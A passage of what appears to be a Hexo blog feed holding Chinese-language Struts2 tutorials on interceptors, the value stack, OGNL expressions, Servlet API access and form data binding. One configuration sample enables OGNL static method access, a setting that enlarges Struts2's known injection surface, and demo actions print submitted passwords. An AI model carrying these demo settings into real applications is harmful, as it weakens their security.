alt=""></p><p>客户端向服务器发送一个Action的请求，执行<strong>核心过滤器</strong>（doFilter）方法。在这个方法中，<strong>调用executeAction()方法</strong>，在这个方法内部调用dispatcher.serviceAction();在这个方法内部创建一个Action代理，最终执行的是Action代理中的execute(),在代理中执行的execute方法中调用ActionInvocation的invoke方法。在这个方法内部递归执行一组拦截器（完成部分功能），<strong>如果没有下一个拦截器，就会执行目标Action，根据Action的返回的结果进行页面跳转。</strong></p><h1 id="拦截器入门"><a href="#拦截器入门" class="headerlink" title="拦截器入门"></a>拦截器入门</h1><h2 id="拦截器类"><a href="#拦截器类" class="headerlink" title="拦截器类"></a>拦截器类</h2><p>InterceptorDemo1</p><pre><code>public class InterceptorDemo1 extends AbstractInterceptor {    // 继承AbstractInterceptor    @Override    // 实现intercept方法    public String intercept(ActionInvocation invocation) throws Exception {        System.out.println(&quot;InterceptorDemo1执行了---------------------&quot;);        String obj = invocation.invoke();    // 如果有下一个拦截器执行下一个拦截器,没有的话执行Action        System.out.println(&quot;InterceptorDemo1执行结束---------------------&quot;);        return obj;     }}</code></pre><p>InterceptorDemo2</p><pre><code>public class InterceptorDemo2 extends AbstractInterceptor {    // 继承AbstractInterceptor    @Override    // 实现intercept方法    public String intercept(ActionInvocation invocation) throws Exception {        System.out.println(&quot;InterceptorDemo2执行了---------------------&quot;);        String obj = invocation.invoke();    // 如果有下一个拦截器执行下一个拦截器,没有的话执行Action        System.out.println(&quot;InterceptorDemo2执行结束---------------------&quot;);        return obj;     }}</code></pre><h2 id="在Struts2的配置文件中配置拦截器"><a href="#在Struts2的配置文件中配置拦截器" class="headerlink" title="在Struts2的配置文件中配置拦截器"></a>在Struts2的配置文件中配置拦截器</h2><pre><code>&lt;struts&gt;    &lt;!-- 开启Struts2的静态方法访问 --&gt;    &lt;constant name=&quot;struts.ognl.allowStaticMethodAccess&quot; value=&quot;true&quot;&gt;&lt;/constant&gt;    &lt;package name=&quot;demo1&quot; extends=&quot;struts-default&quot; namespace=&quot;/&quot;&gt;        &lt;!-- 定义拦截器 --&gt;        &lt;interceptors&gt;            &lt;interceptor name=&quot;interceptorDemo1&quot; class=&quot;web.interceptor.InterceptorDemo1&quot;&gt;&lt;/interceptor&gt;            &lt;interceptor name=&quot;interceptorDemo2&quot; class=&quot;web.interceptor.InterceptorDemo2&quot;&gt;&lt;/interceptor&gt;        &lt;/interceptors&gt;        &lt;!-- 在Action中引入自定义拦截器 --&gt;        &lt;action name=&quot;actionDemo1&quot; class=&quot;web.action.ActionDemo1&quot;&gt;            &lt;result&gt;/demo1/demo1.jsp&lt;/result&gt;            &lt;!-- 一旦引入了自定义拦截器,默认的拦截器栈就不执行了  --&gt;            &lt;interceptor-ref name=&quot;defaultStack&quot;&gt;&lt;/interceptor-ref&gt;        &lt;!-- 默认栈的拦截器 --&gt;            &lt;interceptor-ref name=&quot;interceptorDemo1&quot;&gt;&lt;/interceptor-ref&gt;            &lt;interceptor-ref name=&quot;interceptorDemo2&quot;&gt;&lt;/interceptor-ref&gt;        &lt;/action&gt;        &lt;!-- ui表单demo --&gt;        &lt;action name=&quot;uiAction&quot; class=&quot;web.action.UiActionDemo&quot;&gt;            &lt;result name=&quot;input&quot;&gt;/demo2/demo3.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;    &lt;!--      配置拦截器的第二种方式:定义拦截器栈        &lt;interceptors&gt;            &lt;interceptor name=&quot;interceptorDemo1&quot; class=&quot;web.interceptor.InterceptorDemo1&quot;&gt;&lt;/interceptor&gt;            &lt;interceptor name=&quot;interceptorDemo2&quot; class=&quot;web.interceptor.InterceptorDemo2&quot;&gt;&lt;/interceptor&gt;            &lt;interceptor-stack name=&quot;myStack&quot;&gt;                &lt;interceptor-ref name=&quot;defaultStack&quot;&gt;&lt;/interceptor-ref&gt;                &lt;interceptor-ref name=&quot;interceptorDemo1&quot;&gt;&lt;/interceptor-ref&gt;                &lt;interceptor-ref name=&quot;interceptorDemo2&quot;&gt;&lt;/interceptor-ref&gt;            &lt;/interceptor-stack&gt;        &lt;/interceptors&gt;    --&gt;    &lt;!-- 在Action中引入拦截器栈        &lt;action name=&quot;actionDemo1&quot; class=&quot;web.action.ActionDemo1&quot;&gt;            &lt;result&gt;/demo1/demo1.jsp&lt;/result&gt;            &lt;interceptor-ref name=&quot;myStack&quot;&gt;&lt;/interceptor-ref&gt;        &lt;/action&gt;    --&gt;&lt;/struts&gt;</code></pre><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/DG4E1cExTeiQHbFKtx*S.gDdF1WG7UY6dEbfIRaFE8o!/b/dL8AAAAAAAAA&amp;bo=iAMUAgAAAAADF68!&amp;rf=viewer_4" alt="自定义拦截器输出"></p><h1 id="拦截器中的特殊标签Param"><a href="#拦截器中的特殊标签Param" class="headerlink" title="拦截器中的特殊标签Param"></a>拦截器中的特殊标签Param</h1><p>先上案例</p><pre><code>&lt;action name=&quot;user_*&quot; class=&quot;action.UserAction&quot; method=&quot;{1}&quot;&gt;            &lt;result name=&quot;success&quot;&gt;demo/Manage.jsp&lt;/result&gt;            &lt;!-- 引入拦截器 --&gt;            &lt;interceptor-ref name=&quot;userInterceptor&quot;&gt;                &lt;param name=&quot;excludeMethods&quot;&gt;selectUser&lt;/param&gt;        &lt;!-- 排除拦截如果有多个方法不拦截,用逗号隔开即可                这里的方法指的是UserAction中的方法Fuck                 --&gt;            &lt;/interceptor-ref&gt;            &lt;!-- 引入默认拦截器,必须的. --&gt;            &lt;interceptor-ref name=&quot;defaultStack&quot;&gt;&lt;/interceptor-ref&gt;&lt;/action&gt;</code></pre><p><strong><interceptor-ref></interceptor-ref></strong>标签有个嵌套标签<strong><param></strong>,<strong><param></strong>标签中有个<strong>特殊属性excludeMethod</strong>,这个属性的作用是对某个方法不进行拦截,这里的方法指的是Action中的方法.因为在这里我的UserAction类中的有个selectUser方法,所以这时候当Action执行selectUser方法的时候,拦截器不会对其进行拦截.</p>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2中的值栈</title>
      <link href="/2018/12/22/struts2-zhong-de-zhi-zhan/"/>
      <url>/2018/12/22/struts2-zhong-de-zhi-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="Struts2值栈"><a href="#Struts2值栈" class="headerlink" title="Struts2值栈"></a>Struts2值栈</h1><h2 id="什么是值栈"><a href="#什么是值栈" class="headerlink" title="什么是值栈"></a>什么是值栈</h2><ul><li><strong>ValueStack类似于一个数据中转站Struts2框架中的数据都保存到了ValueStack中</strong><ul><li>ValueStack是一个接口,OgnlValueStack是一个ValueStack接口的实现类</li><li>ValueStack贯穿了Action的整个生命周期(<strong>Action一旦被创建,Struts框架就会创建一个对应的ValueStack对象</strong>)</li><li><strong>Action是多例的</strong></li></ul></li></ul><h2 id="值栈的内部结构"><a href="#值栈的内部结构" class="headerlink" title="值栈的内部结构"></a>值栈的内部结构</h2><p><img src="http://a3.qpic.cn/psb?/V10Lajvl1FgUNv/Y4jsx0aUcXm9HYWSnLbQiAuPahCHqPGdZoHs00yrrWQ!/b/dLoAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=jAYyAwAAAAADN6k!&amp;tl=1&amp;vuin=726301387&amp;tm=1545451200&amp;sce=60-2-2&amp;rf=viewer_4" alt="值栈的内部结构"><br>ValueStack中有两个区域</p><ul><li>root区域:内部是个ArrayList,里面一般放置的是对象,<strong>获取Root数据不需要加#符号</strong></li><li>Context区域:内部是个Map,里面放置的是web开发中的常用的对象数据的引用,<strong>获取context数据需要加#符号</strong><ul><li>root</li><li>request</li><li>session</li><li>application</li><li>parameters</li><li>attr</li></ul></li><li><strong>“操作值栈”</strong>通常<strong>指的是操作ValueStrack中的Root区域</strong>.</li></ul><h2 id="值栈与ActionContext的关系"><a href="#值栈与ActionContext的关系" class="headerlink" title="值栈与ActionContext的关系"></a>值栈与ActionContext的关系</h2><ul><li>ActionContext:Action上下文<ul><li>通过查看源码得知:<strong>当请求过来的时候,执行过滤器中的doFilter方法,在这个方法中创建ActionContext,在创建Actioncontext的过程中,会创建ValueStrack对象,并且将ValueStrack对象传递给ActionContext对象.所以可以通过ActionContext获取ValueStrack(值栈)对象</strong></li><li>ActionContext对象之所以能够访问Servlet的API(访问域对象的数据),因为在其内部有值栈的引用</li></ul></li><li>ServletContext:Servlet上下文</li></ul><h2 id="获得值栈对象"><a href="#获得值栈对象" class="headerlink" title="获得值栈对象"></a>获得值栈对象</h2><ul><li>通过ActionContext对象获取值栈.</li><li>在Struts2内部将值栈存入到Request中,所以还可以通过request获取值栈</li></ul><p>实例:</p><pre><code>public class ValueStackDemo2 extends ActionSupport {    /*     * 在一个Action对象中只会创建一个ValueStrack     */    @Override    public String execute() throws Exception {        //一:通过Actioncontext获得值栈对象        ValueStack valueStrack1 =  ActionContext.getContext().getValueStack();        //二:通过request获得值栈对象//        ServletActionContext.getRequest().getAttribute(&quot;struts.valueStrack&quot;);        ValueStack valueStrack2 = (ValueStack)ServletActionContext.getRequest().getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY);        System.out.println(valueStrack1 == valueStrack2);        return NONE;    }}</code></pre><h2 id="操作值栈-向值栈中存入数据"><a href="#操作值栈-向值栈中存入数据" class="headerlink" title="操作值栈(向值栈中存入数据)"></a>操作值栈(向值栈中存入数据)</h2><ol><li>在Action中提供数据的get方法<ul><li>默认的情况下Struts会将Action对象压入到值栈.Action的属性也会在值栈中</li></ul></li><li>使用ValueStrack中本身的方法</li></ol><p>在Action中提供数据的get方法</p><pre><code>public class ValueStackDemo3 extends ActionSupport {    private User user;    public User getUser() {        return user;    }    //向ValueStrack中存值    @Override    public String execute() throws Exception {        user = new User(&quot;admin&quot;,&quot;admin&quot;);        return SUCCESS;    }</code></pre><p>使用ValueStack自带的方法</p><pre><code>public class ValueStackDemo4 extends ActionSupport {    @Override    public String execute() throws Exception {        //向值栈中保存数据        //1:获得值栈对象        ValueStack valueStack = ActionContext.getContext().getValueStack();        //2:使用push(Object)和set(String key,Object obj)方法向值栈中存入对象        User user = new User(&quot;admin&quot;,&quot;123456&quot;);        valueStack.push(user);        //压栈,在栈的最顶端,只要使用push方法那么存入的对象一定是在栈顶        valueStack.set(&quot;name&quot;,&quot;张三&quot;);        //set方法是创建了一个map集合,然后将map集合压入到栈中        valueStack.set(&quot;age&quot;,88);        return super.execute();    }}</code></pre><h2 id="获取值栈中的数据"><a href="#获取值栈中的数据" class="headerlink" title="获取值栈中的数据"></a>获取值栈中的数据</h2><ul><li>获取root中的数据(不需要加#号)  </li><li>获取Context中的数据(需要加#号)</li></ul><p>例子:</p><pre><code>&lt;!-- 在Iterator标签中如果没定义var属性的话那么在property标签中可以不用写#,如果定义了就必须写#因为他是从值栈的context区域进行取值的 --&gt; &lt;s:iterator var=&quot;c&quot; value=&quot;list&quot;&gt;    &lt;TR        style=&quot;FONT-WEIGHT: normal; FONT-STYLE: normal; BACKGROUND-COLOR: white; TEXT-DECORATION: none&quot;&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_name&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_level&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_source&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_industry&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_phone&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_mobile&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;a            href=&quot;${pageContext.request.contextPath }/customerServlet?method=edit&amp;custId=&lt;s:property value=&quot;#c.cust_id&quot;/&gt;&quot;&gt;修改&lt;/a&gt;            &amp;nbsp;&amp;nbsp; &lt;a            href=&quot;${pageContext.request.contextPath }/customerServlet?method=delete&amp;custId=&lt;s:property value=&quot;#c.cust_id&quot;/&gt;&quot;&gt;删除&lt;/a&gt;        &lt;/TD&gt;    &lt;/TR&gt;&lt;/s:iterator&gt;</code></pre><h2 id="EL为什么能访问值栈中的数据"><a href="#EL为什么能访问值栈中的数据" class="headerlink" title="EL为什么能访问值栈中的数据"></a>EL为什么能访问值栈中的数据</h2><ul><li>因为Struts2框架的底层对request.getAttribute()方法进行了增强</li></ul><p>#OGNL中的符号</p><h2 id="使用-号构建list和Map集合"><a href="#使用-号构建list和Map集合" class="headerlink" title="使用#号构建list和Map集合"></a>使用#号构建list和Map集合</h2><h2 id="号"><a href="#号" class="headerlink" title="%号"></a>%号</h2><ul><li>强制解析OGNL</li><li>强制不解析OGNL</li></ul><h2 id="符号"><a href="#符号" class="headerlink" title="$符号"></a>$符号</h2><p>在配置文件中使用OGNL</p><ul><li>xml<ul><li>文件下载</li></ul></li><li>属性文件<ul><li>国际化</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>OGNL</title>
      <link href="/2018/12/22/ognl/"/>
      <url>/2018/12/22/ognl/</url>
      
        <content type="html"><![CDATA[<h1 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h1><h2 id="什么是OGNL"><a href="#什么是OGNL" class="headerlink" title="什么是OGNL"></a>什么是OGNL</h2><p><strong>对象图导航语言（OGNL）</strong>是一种用于Java的开源表达式语言（EL），它使用比Java语言支持的全部范围更简单的表达式，允许获取和设置属性（通过定义的setProperty和getProperty）方法，在发现的JavaBeans）和Java类的方法执行。它还允许更简单的数组操作。</p><p>它的目的是在<strong>Java EE应用程序中使用taglib作为表达式语言</strong>。</p><p><strong>EL和OGNL的区别</strong></p><ul><li><p>OGNL:<strong>调用对象的方法</strong>,<strong>获取Struts2值栈中的数据,OGNL是第三方的表达式语言.</strong></p></li><li><p>EL:从域对象中获取数据,从<strong>EL的11个对象中获取</strong></p></li></ul><h2 id="OGNL的使用要素"><a href="#OGNL的使用要素" class="headerlink" title="OGNL的使用要素"></a>OGNL的使用要素</h2><ul><li>表达式</li><li>根对象(Root对象)</li><li>Context对象</li></ul><h2 id="OGNL在Java中的使用"><a href="#OGNL在Java中的使用" class="headerlink" title="OGNL在Java中的使用"></a>OGNL在Java中的使用</h2><p><strong>下面的代码均使用Junit进行测试运行</strong></p><p>获取对象的静态方法</p><pre><code>//获取对象的静态方法    @Test    public void demo2() throws OgnlException{        //获得Context        OgnlContext context = new OgnlContext();        //获得根对象        Object root = context.getRoot();        /*         * 执行表达式         * 访问静态方法的方式:         * @类名@方法名         * @java.lang.Math@random()         */        Object obj = Ognl.getValue(&quot;@java.lang.Math@random()&quot;, context, root);        System.out.println(obj);    }</code></pre><p>使用OGNL表达式调用对象的方法</p><pre><code>@Test    /*     * 使用OGNL表达式调用对象的方法     *      * 注意:这里使用的是Junit对方法进行的一个测试 使用Junit的方法: 在方法头上加上一个@Test即可     *      * @在Java中式注解的意思     */    public void demo1() throws OgnlException {        // 获得Context        OgnlContext context = new OgnlContext();        // 获得根对象        Object root = context.getRoot();        // 获取数据(执行表达式)        Object obj = Ognl.getValue(&quot;&#39;helloWorld&#39;.length()&quot;, context, root);        System.out.println(obj);    }</code></pre><p>获得Root中的数据</p><pre><code> // 获取Root中的数据不需要加#在Struts2中需要加#    @Test    public void demo3() throws OgnlException{        //获得Context        OgnlContext context = new OgnlContext();        //向Root中存放一个值        context.setRoot(new User(&quot;admin&quot;,&quot;admin&quot;));        //获得root对象        Object root = context.getRoot();        //执行表达式获取实体类中的值        Object username = Ognl.getValue(&quot;username&quot;, context, root);        Object password = Ognl.getValue(&quot;password&quot;, context, root);        System.out.println(username + &quot;\t&quot; + password);    }</code></pre><p>获得Context中的数据</p><pre><code>//获取Context中的数据需要加#号    @Test    public void demo4() throws OgnlException{        //获得Context        OgnlContext context = new OgnlContext();        //获取root对象        Object root = context.getRoot();        //向context中存入数据        context.put(&quot;name&quot;, &quot;谢文东&quot;);        //获取context中的值        Object obj = Ognl.getValue(&quot;#name&quot;, context, root);        System.out.println(obj);    }</code></pre><h2 id="OGNL在Struts2中的使用"><a href="#OGNL在Struts2中的使用" class="headerlink" title="OGNL在Struts2中的使用"></a>OGNL在Struts2中的使用</h2><p>访问对象的方法</p><pre><code>&lt;!-- value中写OGNL表达式 --&gt;    &lt;p&gt;IlikeJava的长度:&lt;s:property value=&quot;&#39;IlikeJava&#39;.length()&quot;/&gt;&lt;/p&gt;</code></pre><p>访问对象的静态的方法</p><pre><code>&lt;!-- Struts2默认不能访问静态成员,需要手动开启 --&gt;    &lt;!-- struts.ognl.allowStaticMethodAccess=false --&gt;    &lt;p&gt;调用对象的静态方法:        &lt;s:property value=&quot;@java.lang.Math@random()&quot;/&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2Servlet的访问</title>
      <link href="/2018/12/22/struts2servlet-de-fang-wen/"/>
      <url>/2018/12/22/struts2servlet-de-fang-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="完全解耦合的方式"><a href="#完全解耦合的方式" class="headerlink" title="完全解耦合的方式"></a>完全解耦合的方式</h1><p>JSP</p><pre><code>&lt;h3 align=&quot;center&quot;&gt;方式一:完全解耦和&lt;/h3&gt;    &lt;form action=&quot;requestDemo1.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;姓名:&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;密码:&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>/* * 访问ServletApi的方式一:完全解耦和 */public class RequestDemo1 extends ActionSupport {    @Override    public String execute() throws Exception {        //接收参数:利用Struts2中的对象(ActionContext)        ActionContext context = ActionContext.getContext();            //获取实例        //调用ActionContext的getParameters方法        Map&lt;String,Object&gt; map = context.getParameters();        for(String key:map.keySet()){            String[] values = (String[])map.get(key);        //根据key获取value            System.out.println(key+&quot;\t&quot;+Arrays.toString(values));        }        //向域对象中存入数据        context.put(&quot;reqName&quot;,&quot;reqValue&quot;);        //相当于调用了Request.setAttribute()//        Map&lt;String,Object&gt; request=(Map&lt;String, Object&gt;) context.get(&quot;request&quot;);//        request.put(&quot;reqName&quot;,&quot;reqValue&quot;);        //相当于调用了Request.setAttribute()        context.getSession().put(&quot;sessionName&quot;,&quot;sessionValue&quot;);        //相当于Session.setAttribute()        context.getApplication().put(&quot;appName&quot;, &quot;appValue&quot;);        //相当于application.setAttribute()        return SUCCESS;    }}</code></pre><h1 id="使用原生的ServletAPI"><a href="#使用原生的ServletAPI" class="headerlink" title="使用原生的ServletAPI"></a>使用原生的ServletAPI</h1><p>JSP</p><pre><code>&lt;h3 align=&quot;center&quot;&gt;方式二:使用原生的方式访问&lt;/h3&gt;    &lt;form action=&quot;requestDemo2.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;姓名:&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;密码:&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>//使用ServletAPI原生的方式public class RequestDemo2 extends ActionSupport {    public String execute() {        // 接收数据        // 使用ServletActionContext直接获得Request对象        HttpServletRequest request = ServletActionContext.getRequest();        Map&lt;String, String[]&gt; map = request.getParameterMap();        for (String key : map.keySet()) {            String[] value = map.get(key);            System.out.println(key + &quot;\t&quot; + Arrays.toString(value));        }        // 向域对象中存入数据        request.setAttribute(&quot;reqName&quot;, &quot;reqValue&quot;);// 向Request中存入数据        request.getSession().setAttribute(&quot;sessionName&quot;, &quot;sessValue&quot;);// 向session中存入数据        ServletActionContext.getServletContext().setAttribute(&quot;appName&quot;, &quot;appValue&quot;);// 向application中存入数据        return SUCCESS;    }}</code></pre><h1 id="接口注入"><a href="#接口注入" class="headerlink" title="接口注入"></a>接口注入</h1><p>JSP</p><pre><code>&lt;h3 align=&quot;center&quot;&gt;方式二:使用接口注入的方式访问&lt;/h3&gt;    &lt;form action=&quot;requestDemo3.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;姓名:&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;密码:&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>public class RequestDemo3 extends ActionSupport implements ServletRequestAware, ServletContextAware {    private HttpServletRequest request;    private ServletContext context;    public String execute() throws Exception {        // 接收参数        // 通过接口注入的方式获得request对象        Map&lt;String, String[]&gt; map = request.getParameterMap();        for (String key : map.keySet()) {            String[] value = map.get(key);            System.out.println(key + &quot;\t&quot; + Arrays.toString(value));        }        // 向域对象中保存数据        request.setAttribute(&quot;reqName&quot;, &quot;reqValue&quot;); // 向request域中保存数据        request.getSession().setAttribute(&quot;sessionName&quot;, &quot;sessionValue&quot;);// 向session中保存数据        context.setAttribute(&quot;appName&quot;, &quot;appValue&quot;);        return super.execute();    }    public void setServletRequest(HttpServletRequest request) {        this.request = request;    }    public void setServletContext(ServletContext context) {        this.context = context;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2的结果页面的配置</title>
      <link href="/2018/12/22/struts2-de-jie-guo-ye-mian-de-pei-zhi/"/>
      <url>/2018/12/22/struts2-de-jie-guo-ye-mian-de-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="全局结果页面"><a href="#全局结果页面" class="headerlink" title="全局结果页面"></a>全局结果页面</h1><p>全局结果页面指的是，在包中配置一次，其他的在<strong>这个包中的所有的action只要返回了这个值</strong>，<strong>都可以跳转到这个页面。</strong></p><p><strong>针对这个包下的所有的action的配置都有效</strong></p><pre><code>&lt;struts&gt;    &lt;package name=&quot;demo1&quot; namespace=&quot;/&quot; extends=&quot;struts-default&quot;&gt;        &lt;!-- 全局结果页面的配置 --&gt;        &lt;global-results&gt;            &lt;result name=&quot;success&quot;&gt;/demo1/demo2.jsp&lt;/result&gt;        &lt;/global-results&gt;        &lt;action name=&quot;requestDemo1&quot; class=&quot;demo1.RequestDemo1&quot;&gt;            &lt;!-- 这里配置的result结果页面是局部的 --&gt;            &lt;!-- &lt;result name=&quot;success&quot;&gt;/demo1/demo2.jsp&lt;/result&gt; --&gt;        &lt;/action&gt;        &lt;action name=&quot;requestDemo2&quot; class=&quot;demo1.RequestDemo2&quot;&gt;        &lt;/action&gt;        &lt;action name=&quot;requestDemo3&quot; class=&quot;demo1.RequestDemo3&quot;&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><h1 id="局部结果页面"><a href="#局部结果页面" class="headerlink" title="局部结果页面"></a>局部结果页面</h1><p>局部结果页面指的是，<strong>只能在当前的action中的配置有效。</strong></p><p><strong>针对当前的action有效。</strong></p><h1 id="Result标签的配置"><a href="#Result标签的配置" class="headerlink" title="Result标签的配置"></a>Result标签的配置</h1><p>result标签的作用:配置页面的跳转</p><p>属性:</p><ul><li>name属性:<strong>逻辑视图的名称。默认值：success</strong></li><li>type属性:页面跳转类型<ul><li><strong>dispatcher：默认值，请求转发。（Action转发JSP）</strong></li><li><strong>redirect：重定向。（Action重定向JSP）</strong></li><li>chain：转发.（Action转发Action）</li><li>redirectAction：重定向.（Action重定向Action</li><li>stream：Struts2中提供文件下载的功能.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2的数据封装</title>
      <link href="/2018/12/22/struts2-de-shu-ju-feng-zhuang/"/>
      <url>/2018/12/22/struts2-de-shu-ju-feng-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="属性驱动-必须提供属性的set方法-不常用"><a href="#属性驱动-必须提供属性的set方法-不常用" class="headerlink" title="属性驱动:必须提供属性的set方法(不常用)"></a>属性驱动:必须提供属性的set方法(不常用)</h1><p>jsp页面</p><pre><code>&lt;h3&gt;方式一:属性驱动-提供set方法的方式&lt;/h3&gt;    &lt;form action=&quot;userAction1.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;用户名:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;密码:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;年龄:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;生日:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;birthday&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;工资:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;salary&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>//数据封装的方式一:属性驱动-提供属性的set方法的方式public class UserAction1 extends ActionSupport {    //提供了对应的属性    private String username;    private String password;    private Integer age;    private Date birthday;    private Double salary;    //提供属性所对应的set方法    public void setUsername(String username) {        this.username = username;    }    public void setPassword(String password) {        this.password = password;    }    public void setAge(Integer age) {        this.age = age;    }    public void setBirthday(Date birthday) {        this.birthday = birthday;    }    public void setSalary(Double salary) {        this.salary = salary;    }    public String execute(){        //接收数据        System.out.println(username);        System.out.println(password);        System.out.println(age);        System.out.println(birthday);        System.out.println(salary);        //封装数据        User user = new User();        user.setUsername(username);        user.setPassword(password);        user.setAge(age);        user.setBirthday(birthday);        user.setSalary(salary);        return NONE;    }}</code></pre><h1 id="属性驱动-页面提供表达式"><a href="#属性驱动-页面提供表达式" class="headerlink" title="属性驱动:页面提供表达式"></a>属性驱动:页面提供表达式</h1><p>JSP</p><pre><code>&lt;h3&gt;方式二:属性驱动-页面中提供表达式的写法&lt;/h3&gt;    &lt;form action=&quot;userAction2.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;用户名:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;user.username&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;密码:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;password&quot; name=&quot;user.password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;年龄:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;user.age&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;生日:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;user.birthday&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;工资:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;user.salary&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                    &lt;input type=&quot;submit&quot; 